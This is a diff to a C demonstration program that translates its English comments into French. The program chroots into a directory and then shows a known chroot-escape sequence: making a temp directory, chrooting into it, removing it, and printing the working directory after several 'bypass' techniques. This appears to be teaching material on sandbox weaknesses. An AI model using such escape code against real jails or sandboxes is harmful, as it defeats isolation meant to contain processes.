@@ -23,37 +23,34 @@ int main(void)
 	printf("Reportoire current: %s\n", buf);
 
 
-	// The file "/temois" probably doesn't exist on your computer.
+	// Le fichier "/temois" n'existe pas dans notre système.
 	struct stat statBuf;
 	if(stat("/temois", &statBuf) == -1)
 		perror("stat(/temois)");
 	else
 		printf("/temois");
 	
-	if(chroot(buf) == -1) // make the current directory be /
+	if(chroot(buf) == -1) // chrooter? /
 	{
 		perror("chroot");
 		printf("Etes vous root?\n");
 		exit(EXIT_FAILURE);
 	}
 
-	// From this point on, this program will think that the root
-	// directory "/" is this directory!
+	// Le repertoire "/" va devenir dès maintenant le repertoire current
 	getcwd(buf, 1024);
 	printf("Reportoire current: %s\n", buf);
-	// The file "/temois" should exist!
+	// Le fichier "/temois" doit exister!
 	if(stat("/temois", &statBuf) == -1)
 		perror("stat(/temois)");
 	else
 		printf("found /temois\n");
 
-	/* It is possible to break out of chroot using this approach. This
-	 * general approach is not a secret and is documented in the
-	 * chroot man page. */
+	/* Technique de bypass du chroot documentée dans la chroot man page. */
 	printf("Bypass du chroot....\n");
 	mkdir("chroot.temp", 0777);
-	chroot("chroot.temp"); // Now we are not inside of the new root!?!
-	rmdir("chroot.temp"); // cleanup after ourselves
+	chroot("chroot.temp"); // Maintenant nous nous sommes plus à l'interrieur du chroot!?!
+	rmdir("chroot.temp"); // nettoyage
 
 	getcwd(buf, 1024);
 	printf("Reportoire current (technique de bypasse 1): %s\n", buf);
@@ -69,7 +66,7 @@ int main(void)
 	getcwd(buf, 1024);
 	printf("Reportoire current (technique de bypasse 3): %s\n", buf);
 
-	// List the files in this directory so you can verify that we got
+	// Lister les fichiers pour vérifier que nous sommes plus à l'intérieur du chroot
 	// out.
 	printf("Liste des fichiers dans le repertoire\n");
 	execlp("ls", "/", NULL);
